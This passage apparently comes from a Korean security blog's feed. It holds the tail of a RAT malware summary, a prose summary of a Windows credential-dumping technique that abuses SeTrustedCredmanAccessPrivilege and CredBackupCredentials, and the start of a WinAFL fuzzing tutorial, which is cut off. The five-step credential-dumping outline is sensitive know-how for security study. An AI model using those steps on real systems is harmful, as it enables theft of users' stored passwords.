&#xD30C;&#xC77C;&#xC5D0;&#xC11C; VBScript&#xB098; Powershell&#xC744; &#xD1B5;&#xD574; RAT &#xD30C;&#xC77C;&#xC744; &#xB4DC;&#xB86D;&#xD558;&#xACE0;, Microsoft Defender&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xACF5;&#xD1B5;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>autohotkey</tag>
      
      <tag>rat</tag>
      
      <tag>trojan</tag>
      
      <tag>vbscript</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</title>
    <link href="/2021/05/23/j0ker/2021-05-23/"/>
    <url>/2021/05/23/j0ker/2021-05-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html">Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows&#xC5D0;&#xC11C;&#xB294; <code>Credential Manager</code>&#xB97C; &#xD1B5;&#xD574; credential&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Credential&#xB4E4;&#xC740; DPAPI&#xB97C; &#xD1B5;&#xD574; &#xBCF4;&#xD638;&#xB418;&#xBA70;, &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB9CC; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Remote Desktop Client&#xC5D0;&#xC11C;&#xB294; <code>CredWrite</code>&#xB77C;&#xB294; API&#xB97C; &#xD1B5;&#xD574; domain credential&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; <code>CREDENTIAL</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC720;&#xC800;&#xBA85;&#xACFC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAC8C; &#xB418;&#xBA70; type&#xC740; <code>CRED_TYPE_DOMAIN_PASSWORD</code>&#xC73C;&#xB85C; &#xC138;&#xD305;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC800;&#xC7A5;&#xB41C; credential&#xB4E4;&#xC740; <code>CredRead</code>, <code>CredEnumerate</code> &#xAC19;&#xC740; API&#xB97C; &#xD1B5;&#xD574; &#xC77D;&#xC5B4;&#xC62C; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, <code>CRED_TYPE_DOMAIN_PASSWORD</code>&#xB85C; type&#xC774; &#xC138;&#xD305;&#xB418;&#xBA74; credential&#xC744; &#xC77D;&#xC5B4;&#xC640;&#xB3C4; &#xAD6C;&#xC870;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC5C6;&#xAC8C; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. NTLM, Kerberos, TSSSP &#xAC19;&#xC774; LSASS &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBCF4;&#xC548; &#xD328;&#xD0A4;&#xC9C0;&#xB4E4;&#xC740; &#xB0B4;&#xBD80; API&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB7F0; &#xC81C;&#xC57D; &#xC5C6;&#xC774; credential &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xC5D0; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Credential&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xC758; <code>DPAPI</code> &#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5B4; &#xD30C;&#xC77C; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xC5EC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC77D;&#xC5B4;&#xC62C;<code>&#xC218; &#xC5C6;&#xB294; &#xC774;&#xC720;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758;</code>DPAPI<code>&#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB354;&#xB77C;&#xB3C4; LSASS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB9CC; DPAPI&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;</code>Mimikatz<code>&#xAC19;&#xC740; &#xD234;&#xC5D0;&#xC11C;&#xB294;</code>LSASS`&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAC70;&#xB098; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xBC14;&#xB85C; &#xC77D;&#xC5B4;&#xB4E4;&#xC774;&#xB294; &#xB4F1; &#xBC29;&#xC2DD;&#xC744; &#xD1B5;&#xD574; credential&#xC744; &#xC77D;&#xC5B4;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C; James Forshaw&#xB294; <code>LSASS</code>&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>SeTrustedCredmanAccessPrivilege</code> &#xAD8C;&#xD55C;&#xC744; &#xC774;&#xC6A9;&#xD574; credential&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC744; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>SeTrustedCredmanAccessPrivilege</code>&#xAD8C;&#xD55C;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xB85C;&#xC11C; <code>Credential Manager</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xAD8C;&#xD55C;&#xC785;&#xB2C8;&#xB2E4;. LSASRV.dll&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <code>CredpIsRpcClientTrusted</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xAD8C;&#xD55C;&#xC744; &#xCCB4;&#xD06C;&#xD558;&#xB294;&#xB370;, &#xC774; &#xD568;&#xC218;&#xB294; <code>CredrReadByTokenHandle</code>&#xC640; <code>CredrBackupCredentials</code> &#xC774; &#xB450; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB9CC; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; <code>CredBackupCredentials</code> &#xD568;&#xC218;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; credential&#xC744; &#xBC31;&#xC5C5;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xBA70; <code>SeTrustedCredmanAccessPrivilege</code> &#xAD8C;&#xD55C;&#xB9CC; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBA74; &#xD638;&#xCD9C;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. <code>CREDWIZ.exe</code> &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. <code>CREDWIZ.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xBC31;&#xC5C5;&#xD560; &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xACE0; <code>Winlogon</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; RPC&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; credential&#xC744; &#xBC31;&#xC5C5;&#xD558;&#xB294;&#xB370;, &#xC774; &#xB54C; &#xBC31;&#xC5C5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xB2E4;&#xC2DC; &#xBCF5;&#xAD6C;&#xD558;&#xBA70; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xAC00; &#xB2F4;&#xACA8; &#xC788;&#xB294; credential&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC544;&#xB798; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xC758; credential&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>WinLogon</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xD1A0;&#xD070;&#xC758; &#xD578;&#xB4E4;&#xC744; &#xD68D;&#xB4DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD68D;&#xB4DD;&#xD55C; &#xD1A0;&#xD070;&#xC744; Impersonation &#xD1A0;&#xD070;&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; <code>SeTrustedCredmanAccessPrivilege</code> &#xAD8C;&#xD55C;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC778;&#xC99D;&#xB41C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xD1A0;&#xD070;&#xC744; Open &#xD569;&#xB2C8;&#xB2E4;.</li><li>Impersonation&#xB41C; <code>WinLogon</code> &#xD1A0;&#xD070;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; <code>CredBackupCredentials</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC5D0; crendential&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xBC31;&#xC5C5; &#xC2DC; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB294; NULL&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218;&#xACE0;&#xB97C; &#xB35C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>Impersonation &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; <code>CryptUnprotectData</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; credential&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>j0ker</tag>
      
      <tag>token</tag>
      
      <tag>privileges</tag>
      
      <tag>setrustedcredmanaccessprivilege</tag>
      
      <tag>credentials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] WinAFL로 마구 퍼징하기 Part1</title>
    <link href="/2021/05/23/fabu1ous/winafl-1/"/>
    <url>/2021/05/23/fabu1ous/winafl-1/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; Fabu1ous&#xC785;&#xB2C8;&#xB2E4;. &#xCD5C;&#xADFC; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xD558;&#xBA74;&#xC11C; WinAFL &#xC0AC;&#xC6A9;&#xBC95;&#xC744; &#xC775;&#xD788;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. WinAFL&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; Harness &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xD1B5;&#xD574; &#xD2B9;&#xC815; &#xD568;&#xC218;&#xB9CC;&#xC744; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBE60;&#xB978; &#xD37C;&#xC9D5;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. Harness&#xB294; &#xC218;&#xB808;&#xB97C; &#xB04C; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB9D0;&#xC5D0;&#xAC8C; &#xC50C;&#xC6B0;&#xB294; &#xC81C;&#xAC08;, &#xB9D0;&#xC548;&#xC7A5;, &#xACE0;&#xC090; &#xB4F1;&#xC774; &#xD569;&#xCCD0;&#xC9C4; &#xAE30;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. <del>&#xD55C;&#xAE00;&#xB85C;&#xB294; &#xB9C8;&#xAD6C;&#xB77C;&#xACE0; &#xBD80;&#xB974;&#xB294;&#xB370; &#xB9C8;&#xAD6C;&#xB85C; &#xB9C8;&#xAD6C; &#xD37C;&#xC9D5; &#xD558;&#xBA74; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB9C8;&#xAD6C;&#xB9C8;&#xAD6C; &#xD130;&#xC9C0;&#xB098;?</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/1.png" alt></p><p>WinAFL&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC18C;&#xAC1C;&#xC640; &#xC9C1;&#xC811; Harness&#xB97C; &#xC791;&#xC131;&#xD574;&#xBCF8; &#xACFC;&#xC815;&#xC744; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; Part 1&#xC5D0;&#xC120; &#xCC98;&#xC74C; Harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xD37C;&#xC9D5; &#xD574;&#xBCF8; &#xACFC;&#xC815;&#xC744;, &#xB2E4;&#xC74C; &#xAE00;&#xC778; Part 2&#xC5D0;&#xC120; Harness&#xC758; &#xC18D;&#xB3C4; &#xAC1C;&#xC120;&#xC744; &#xC704;&#xD574; &#xC0BD;&#xC9C8;&#xD55C; &#xACFC;&#xC815;&#xC744; &#xC368;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;. </p><h1 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h1><p>AFL(American Fuzzy Lop)&#xC740; Coverage-guided &#xD37C;&#xC9D5; &#xD234;&#xC785;&#xB2C8;&#xB2E4;. Execution path &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD55C; &#xB113;&#xC740; &#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0;&#xC640; &#xB8E8;&#xD504; &#xC2E4;&#xD589;&#xC744; &#xD1B5;&#xD55C; &#xBE60;&#xB978; &#xC18D;&#xB3C4;&#xAC00; &#xD2B9;&#xC9D5;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB7EC;&#xD55C; AFL&#xC744; Windows&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xBCC0;&#xD615;&#xD55C; &#xAC83;&#xC774; &#xBC14;&#xB85C; WinAFL&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xBC88; &#xC2DC;&#xB9AC;&#xC988;&#xC5D0;&#xC120; WinAFL&#xC758; &#xBE60;&#xB978; &#xD37C;&#xC9D5; &#xC18D;&#xB3C4;&#xC5D0; &#xC9D1;&#xC911;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;. WinAFL&#xC758; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;(iteration)&#xC740; &#xB2E4;&#xB978; &#xD37C;&#xC800; &#xB4E4;&#xACFC; &#xB2E4;&#xB978; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xC774;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;</li><li>&#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0; &#xAE30;&#xB85D;</li><li>&#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xAC00; &#xB9AC;&#xD134;&#xD560; &#xB54C;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;</li><li>&#xCF54;&#xB4DC; &#xCEE4;&#xBC84;&#xB9AC;&#xC9C0; &#xD68C;&#xC218;, input &#xD30C;&#xC77C; &#xC218;&#xC815;, EIP&#xB97C; &#xC870;&#xC791;&#xD574; 2&#xBC88; &#xACFC;&#xC815;&#xC73C;&#xB85C; &#xBCF5;&#xADC0;</li><li>&#xC77C;&#xC815; &#xD69F;&#xC218;&#xB9CC;&#xD07C; &#xBC18;&#xBCF5; &#xC2E4;&#xD589; &#xD6C4; &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;, 1&#xBC88;&#xBD80;&#xD130; &#xB2E4;&#xC2DC; &#xC2DC;&#xC791;</li></ol><p>&#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xAC8C; &#xBC14;&#xB85C; 4&#xBC88; &#xACFC;&#xC815;, &#xC989; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB9CC; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xC744; &#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB9E4;&#xBC88; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xACE0; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xB294;&#xB370; &#xB4DC;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xC808;&#xC57D;&#xD560; &#xC218; &#xC788;&#xACE0; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xC640; &#xADF8; &#xC11C;&#xBE0C; &#xB8E8;&#xD2F4;&#xB9CC;&#xC744; &#xD37C;&#xC9D5; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8;&#xB9CC;&#xD07C; &#xBE60;&#xB978; &#xC18D;&#xB3C4;&#xB97C; &#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xD658;&#xACBD;-&#xC124;&#xC815;"><a href="#&#xD658;&#xACBD;-&#xC124;&#xC815;" class="headerlink" title="&#xD658;&#xACBD; &#xC124;&#xC815;"></a>&#xD658;&#xACBD; &#xC124;&#xC815;</h1><p>&#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC124;&#xBA85;&#xC774; &#xB05D;&#xB0AC;&#xC73C;&#xB2C8; &#xC9C1;&#xC811; &#xC0AC;&#xC6A9;&#xD574;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;? <a href="https://github.com/googleprojectzero/winafl">WinAFL &#xACF5;&#xC2DD; &#xAE43;&#xD5C8;&#xBE0C;</a>&#xC5D0; &#xBE4C;&#xB4DC;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC4F0;&#xC5EC;&#xC788;&#xAE30;&#xB294; &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xB294; &#xADF8;&#xAC78; &#xBCF4;&#xACE0;&#xB3C4; &#xC0BD; &#xC9D1;&#xD574;&#xC11C; &#xAE00;&#xB85C; &#xB0A8;&#xACA8;&#xB193;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <del>&#xBA4D;&#xCCAD;&#xC774;</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/2.png" alt></p><h3 id="&#xC900;&#xBE44;&#xBB3C;"><a href="#&#xC900;&#xBE44;&#xBB3C;" class="headerlink" title="&#xC900;&#xBE44;&#xBB3C;"></a>&#xC900;&#xBE44;&#xBB3C;</h3><ol><li>Visual Studio</li><li>DynamoRIO</li><li>cmake</li><li>WinAFL</li></ol><p>&#xAC01;&#xAC01; &#xACF5;&#xC2DD; &#xD648;&#xD398;&#xC774;&#xC9C0;&#xB098; &#xAE43;&#xD5C8;&#xBE0C;&#xC5D0;&#xC11C; &#xC27D;&#xAC8C; &#xAD6C;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC124;&#xB9C8; &#xC5EC;&#xAE30;&#xC11C;&#xBD80;&#xD130; &#xB9C9;&#xD788;&#xC2DC;&#xB294; &#xBD84;&#xC740; &#xC5C6;&#xC73C;&#xB9AC;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xC6EC;&#xB9CC;&#xD558;&#xBA74;(&#xD2B9;&#xD788; Visual Studio&#xB294;) &#xCD5C;&#xC2E0; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xC900;&#xBE44;&#xD574;&#xC8FC;&#xC138;&#xC694;.  </p><p><img src="/2021/05/23/fabu1ous/winafl-1/3.png" alt></p><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cd</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cmake</span> -G<span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A Win<span class="hljs-number">32</span> .. -DDynamoRIO_DIR=%DynamoRIO&#xACBD;&#xB85C;%\cmake</code></pre><p>Visual Studio&#xC758; command prompt&#xB97C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD558;&#xACE0; winafl-master &#xD3F4;&#xB354; &#xB0B4;&#xBD80;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xB4E4;&#xC744; &#xC2E4;&#xD589;&#xD574; &#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; 32bit&#xC9DC;&#xB9AC; DLL&#xC744; &#xD37C;&#xC9D5; &#xD558;&#xAE30; &#xC704;&#xD574; <code>x86_x64 Cross Tools Command Prompt</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. <code>-DDynamoRIO</code> &#xC635;&#xC158; &#xAC12;&#xC5D0; DynamoRIO &#xC18D;&#xC5D0; &#xC788;&#xB294; cmake &#xD3F4;&#xB354;&#xB85C; &#xC9C0;&#xC815;&#xD574;&#xC8FC;&#xC154;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/4.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; Configuring done, Generateing done&#xC774; &#xCD9C;&#xB825;&#xB41C;&#xB2E4;&#xBA74; &#xBE4C;&#xB4DC; &#xC900;&#xBE44;&#xAC00; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">cmake --build . --config Release</code></pre><p>&#xC774;&#xC81C; &#xC704; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD574; &#xBE4C;&#xB4DC;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xBE4C;&#xB4DC;&#xAC00; &#xC798; &#xB418;&#xC5C8;&#xB2E4;&#xBA74; <code>%winafl-master%\build32\bin\Release</code>&#xC5D0; afl-fuzz.exe&#xC640; winafl.dll&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2E4;&#xC81C;&#xB85C; &#xD37C;&#xC9D5;&#xC744; &#xB3CC;&#xB9B4; &#xB54C; &#xC0AC;&#xC6A9;&#xD560; &#xCE5C;&#xAD6C;&#xB4E4;&#xC774;&#xB2C8; &#xAF2D; &#xC704;&#xCE58;&#xB97C; &#xAE30;&#xC5B5;&#xD574;&#xB450;&#xC138;&#xC694;. git clone &#xD558;&#xBA74;&#xC11C; &#xC774;&#xBBF8; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xC774;&#xAC83;&#xB4E4;&#xACFC; &#xD587;&#xAC08;&#xB9AC;&#xC2DC;&#xBA74; &#xC548; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Target-Function"><a href="#Target-Function" class="headerlink" title="Target Function"></a>Target Function</h1><p>WinAFL&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB9CC;&#xC744; &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34; &#xD568;&#xC218;&#xB098; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC7A1;&#xACE0; &#xD37C;&#xC9D5;&#xC744; &#xB3CC;&#xB9B4; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2C8;&#xACE0; &#xBA87; &#xAC00;&#xC9C0; &#xCDA9;&#xC871;&#xD574;&#xC57C; &#xD560; &#xC870;&#xAC74;&#xB4E4;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD37C;&#xC9D5;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC55E;&#xC11C; &#xBA3C;&#xC800; &#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB300;&#xD55C; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xC57C; &#xD558;&#xACE0; &#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xC120;&#xC815;&#xC5D0; &#xB9CE;&#xC740; &#xC2DC;&#xAC04;&#xC744; &#xD22C;&#xC790;&#xD558;&#xAC8C; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <del>&#xCC38; &#xAE50;&#xAE50;&#xD558;&#xB0B4;</del></p><p>&#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD574;&#xC57C; 